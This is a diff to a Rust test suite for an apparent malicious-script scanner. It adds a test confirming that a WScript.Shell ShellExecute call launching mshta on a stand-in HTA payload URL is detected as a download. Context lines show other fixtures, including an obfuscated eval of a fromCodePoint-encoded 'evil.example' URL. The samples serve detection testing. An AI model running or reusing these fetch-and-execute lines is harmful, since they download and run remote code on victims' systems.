@@ -20257,6 +20257,26 @@ task["Run"]("mshta js-bracket-run-fp.example/payload.hta");"#
     }
 
     #[test]
+    fn js_wscript_shell_bracket_shellexecute_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"new ActiveXObject("WScript.Shell")["ShellExecute"]("mshta", "js-bracket-shellexecute.example/payload.hta", "", "open", 0);"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://js-bracket-shellexecute.example/payload.hta"
+                )
+            }),
+            "JS WScript.Shell bracket ShellExecute schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_fromcodepoint_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let js = br#"eval(String.fromCodePoint(104,116,116,112,58,47,47,101,118,105,108,46,101,120,97,109,112,108,101,47,120))"#.to_vec();
